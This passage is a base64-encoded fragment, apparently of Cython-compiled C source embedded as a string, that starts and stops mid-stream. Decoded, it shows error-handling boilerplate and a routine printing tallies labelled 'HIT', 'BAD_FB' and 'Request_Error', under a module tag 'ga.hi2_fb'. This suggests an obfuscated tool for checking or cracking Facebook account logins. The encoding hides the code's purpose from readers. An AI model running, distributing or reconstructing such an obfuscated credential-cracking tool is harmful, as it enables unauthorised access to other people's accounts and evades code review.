U5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzIxLCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8zLCBOVUxMfTsKICAgICAgICAgICAgICBfX3B5eF90XzIwID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMS1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDsKICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjApKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0w1N19lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDsKICAgICAgICAgICAgIHsKICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEzLCAmX19weXhfdF8xNCwgJl9fcHl4X3RfMTUpOwogICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEzKTsKICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRfY291bnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTgpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0w2M19lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTgpOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzIwID0gX19QeXhfUHlMb25nX0FkZE9iakMo""X19weXhfdF8xOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEsIDEsIDEsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjApKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0w2M19lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjApOwogICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwOwogICAgICAgICAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9jb3VudCwgX19weXhfdF8yMCkgPCAwKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0w2M19lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDsKCiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwOwogICAgICAgICAgICAgICAgZ290byBfX3B5eF9MNzBfdHJ5X2VuZDsKICAgICAgICAgICAgICAgIF9fcHl4X0w2M19lcnJvcjo7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMCk7IF9fcHl4X3RfMjAgPSAwOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImdhLmhpMl9mYiIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICAgICAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzIwLCAmX19weXhfdF8xOCwgJl9fcHl4X3RfMjEpIDwgMCkgX19QWVhfRVJSKDAsIDkyLCBfX3B5eF9MNjVfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjApOwogICAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTgpOwogICAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjEpOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzMgPSBQeVR1cGxlX1BhY2soMywgX19weXhfdF8yMCwgX19weXhfdF8xOCwgX19weXhfdF8yMSk7IGlmICh1bmxpa2VseSghX19weXhf""dF8zKSkgX19QWVhfRVJSKDAsIDkyLCBfX3B5eF9MNjVfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgICAgICAgICAgICAgICAgX19weXhfdF8xNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xMiwgX19weXhfdF8zLCBOVUxMKTsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNikpIF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDY1X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTYpOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMTYpOwogICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICAgICAgICAgICAgICBpZiAoX19weXhfdF8xMSA8IDApIF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDY1X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICAgICAgX19weXhfdF8xNyA9ICghX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzE3KSkgewogICAgICAgICAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8yMCk7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzE4KTsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIxKTsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKF9fcHl4X3RfMjAsIF9fcHl4X3RfMTgsIF9fcHl4X3RfMjEpOwogICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMjAgPSAwOyAgX19weXhfdF8xOCA9IDA7ICBfX3B5eF90XzIxID0gMDsgCiAgICAgICAgICAgICAgICAgICAgX19QWVhfRVJSKDAsIDkyLCBfX3B5eF9MNjVfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMCk7IF9fcHl4X3RfMjAgPSAwOwogICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDsKICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7CiAgICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDY0X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgX19weXhfTDY1X2V4Y2VwdF9lcnJvcjo7CiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEzKTsKICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpOwogICAgICAgICAgICAgICAgX19QeXhfWEdJ""VkVSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEzLCBfX3B5eF90XzE0LCBfX3B5eF90XzE1KTsKICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDU1X2Vycm9yOwogICAgICAgICAgICAgICAgX19weXhfTDY0X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTMpOwogICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTsKICAgICAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTMsIF9fcHl4X3RfMTQsIF9fcHl4X3RfMTUpOwogICAgICAgICAgICAgICAgX19weXhfTDcwX3RyeV9lbmQ6OwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAgewogICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmIChfX3B5eF90XzEyKSB7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTUgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMTIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdLCBOVUxMKTsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE1KSkgX19QWVhfRVJSKDAsIDkyLCBfX3B5eF9MNTVfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE1KTsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDYyOwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBfX3B5eF9MNjI6OwogICAgICAgICAgICB9CiAgICAgICAgICAgIGdvdG8gX19weXhfTDc0OwogICAgICAgICAgICBfX3B5eF9MNTdfZXJyb3I6OwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgICAgICBnb3RvIF9fcHl4X0w1NV9lcnJvcjsKICAgICAgICAgICAgX19weXhfTDc0OjsKICAgICAgICAgIH0KCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfMTggPSBOVUxMOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogICAgICAgICAgX19weXhfdF8yMCA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAoKICAgICAgICAgIAogICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOTUsIF9fcHl4X0w1NV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgICAgICAgX19weXhfdF8yID0gX19QeXhf""UHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDk1LCBfX3B5eF9MNTVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRfY291bnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA5NSwgX19weXhfTDU1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgICAgICBfX3B5eF90XzI0ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yNCkpIF9fUFlYX0VSUigwLCA5NSwgX19weXhfTDU1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjQpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hpdF9jb3VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDk1LCBfX3B5eF9MNTVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgICAgICAgIF9fcHl4X3RfMjUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzI1KSkgX19QWVhfRVJSKDAsIDk1LCBfX3B5eF9MNTVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yNSk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X1EsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA5NSwgX19weXhfTDU1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMjYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9IKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzI2KSkgX19QWVhfRVJSKDAsIDk1LCBfX3B5eF9MNTVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yNik7CiAgICAgICAgICBfX3B5eF90XzI3ID0gX19Q""eXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMjYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjcpKSBfX1BZWF9FUlIoMCwgOTUsIF9fcHl4X0w1NV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzI3KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzI2KTsgX19weXhfdF8yNiA9IDA7CiAgICAgICAgICBfX3B5eF90XzIyWzBdID0gX19weXhfdF8yOwogICAgICAgICAgX19weXhfdF8yMlsxXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQkFEX0ZCOwogICAgICAgICAgX19weXhfdF8yMlsyXSA9IF9fcHl4X3RfMjQ7CiAgICAgICAgICBfX3B5eF90XzIyWzNdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9ISVQ7CiAgICAgICAgICBfX3B5eF90XzIyWzRdID0gX19weXhfdF8yNTsKICAgICAgICAgIF9fcHl4X3RfMjJbNV0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1JlcXVlc3RfRXJyb3I7CiAgICAgICAgICBfX3B5eF90XzIyWzZdID0gX19weXhfdF8zOwogICAgICAgICAgX19weXhfdF8yMls3XSA9IF9fcHl4X3RfMjc7CiAgICAgICAgICBfX3B5eF90XzI2ID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8yMiwgOCwgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8yKSArIDkgKiAyICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8yNCkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzI1KSArIDE4ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8zKSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMjcpLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8yKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzI0KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzI1KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzMpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMjcpKTsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yNikpIF9fUFlYX0VSUigwLCA5NSwgX19weXhfTDU1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjYpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yNCk7IF9fcHl4X3RfMjQgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjUpOyBfX3B5eF90XzI1ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjcpOyBfX3B5eF90XzI3ID0gMDsKICAgICAgICAgIF9fcHl4""X3RfNSA9IDE7CiAgICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzE4LCBfX3B5eF90XzI2fTsKICAgICAgICAgICAgX19weXhfdF8yMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMjAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDItX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yNik7IF9fcHl4X3RfMjYgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yMCk7IF9fcHl4X3RfMjAgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjEpKSBfX1BZWF9FUlIoMCwgOTQsIF9fcHl4X0w1NV9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjEpOwogICAgICAgICAgfQogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDsKICAgICAgICB9CgogICAgICAgIAogICAgICAgICB7CiAgICAgICAgICB7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X1EpOyBfX3B5eF92X1EgPSAwOwogICAgICAgICAgICBnb3RvIF9fcHl4X0w1NjsKICAgICAgICAgIH0KICAgICAgICAgIF9fcHl4X0w1NV9lcnJvcjo7CiAgICAgICAgICB7CiAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgICAgICBfX3B5eF90XzEyID0gMDsgX19weXhfdF8xNSA9IDA7IF9fcHl4X3RfMTQgPSAwOyBfX3B5eF90XzEzID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMzAgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yNCk7IF9fcHl4X3RfMjQgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjUpOyBfX3B5eF90XzI1ID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzI2KTsgX19weXhfdF8yNiA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yNyk7IF9fcHl4X3RfMjcgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZfX3B5eF90XzEzLCAmX19weXhfdF8xNiwgJl9fcHl4""X3RfMzApOwogICAgICAgICAgICBpZiAoIHVubGlrZWx5KF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xMiwgJl9fcHl4X3RfMTUsICZfX3B5eF90XzE0KSA8IDApKSBfX1B5eF9FcnJGZXRjaCgmX19weXhfdF8xMiwgJl9fcHl4X3RfMTUsICZfX3B5eF90XzE0KTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEyKTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEzKTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE2KTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMwKTsKICAgICAgICAgICAgX19weXhfdF8yMyA9IF9fcHl4X2xpbmVubzsgX19weXhfdF8yOCA9IF9fcHl4X2NsaW5lbm87IF9fcHl4X3RfMjkgPSBfX3B5eF9maWxlbmFtZTsKICAgICAgICAgICAgewogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X1EpOyBfX3B5eF92X1EgPSAwOwogICAgICAgICAgICB9CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTMpOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zMCk7CiAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTMsIF9fcHl4X3RfMTYsIF9fcHl4X3RfMzApOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEyKTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpOwogICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKF9fcHl4X3RfMTIsIF9fcHl4X3RfMTUsIF9fcHl4X3RfMTQpOwogICAgICAgICAgICBfX3B5eF90XzEyID0gMDsgX19weXhfdF8xNSA9IDA7IF9fcHl4X3RfMTQgPSAwOyBfX3B5eF90XzEzID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMzAgPSAwOwogICAgICAgICAgICBfX3B5eF9saW5lbm8gPSBfX3B5eF90XzIzOyBfX3B5eF9jbGluZW5vID0gX19weXhfdF8yODsgX19weXhfZmlsZW5hbWUgPSBfX3B5eF90XzI5OwogICAgICAgICAgICBnb3RvIF9fcHl4X0w3X2V4Y2VwdF9lcnJvcjsKICAgICAgICAgIH0KICAgICAgICAgIF9fcHl4X0w1Njo7CiAgICAgICAgfQogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgIGdvdG8gX19weXhfTDZfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICAgIH0KICAgICAgZ290byBfX3B5eF9MN19leGNlcHRfZXJyb3I7CgogICAgICAKICAgICAgX19weXhfTDdfZXhjZXB0X2Vycm9yOjsKICAg""ICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF85KTsKICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF85LCBfX3B5eF90XzEwKTsKICAgICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgICAgX19weXhfTDZfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpOwogICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEwKTsKICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzksIF9fcHl4X3RfMTApOwogICAgICBfX3B5eF9MMTJfdHJ5X2VuZDo7CiAgICB9CgogICAgCiAgICBfX3B5eF90XzYgPSBOVUxMOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgOTYsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzIxID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEsIF9fcHl4X2